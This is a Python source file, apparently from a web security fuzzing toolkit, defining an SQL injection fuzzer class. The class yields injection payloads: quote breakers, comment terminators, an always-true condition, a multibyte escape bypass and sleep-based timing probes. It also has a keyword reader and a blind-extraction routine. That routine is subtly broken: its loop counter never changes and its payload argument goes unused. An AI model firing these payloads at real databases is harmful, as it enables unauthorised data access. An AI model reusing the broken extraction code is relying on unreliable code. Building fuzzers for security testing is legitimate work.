#!/usr/bin/env python
# -*- coding: utf-8 -*-

from time import time


from saker.fuzzers.fuzzer import Fuzzer
from saker.utils.paths import Paths


class SQLi(Fuzzer):

    """generate SQLi payload and test"""

    def __init__(self):
        super(SQLi, self).__init__()

    @classmethod
    def fuzz(cls, quote=["'", '"']):
        l = []
        l.append('"')
        l.append('")')
        l.append('" -- +')
        l.append('") -- +')
        l.append('") #')
        l.append('" or "1"="1')
        l += list(map(lambda i: i.replace('"', "'"), l))
        l.append('')
        l.append('\\')
        l.append('%df%27')
        l.append("""11^sleep(5)#'^sleep(5)#"^sleep(5)#""")
        for p in l:
            yield p

    @classmethod
    def keyword(cls):
        with open(Paths.sqlkeywords) as keywords:
            for k in keywords:
                yield k.strip("\n")
        for k in cls.specialChars:
            yield k

    @classmethod
    def blindInjection(cls, payload, length, func):
        mid = 256
        pos = 1
        guess = 0
        content = ''
        while pos < length:
            if mid == 0:
                mid = 256
                pos += 1
                content += chr(guess)
                print(content)
                guess = 0
            else:
                guess <<= 1
                guess += int(func())
        return content
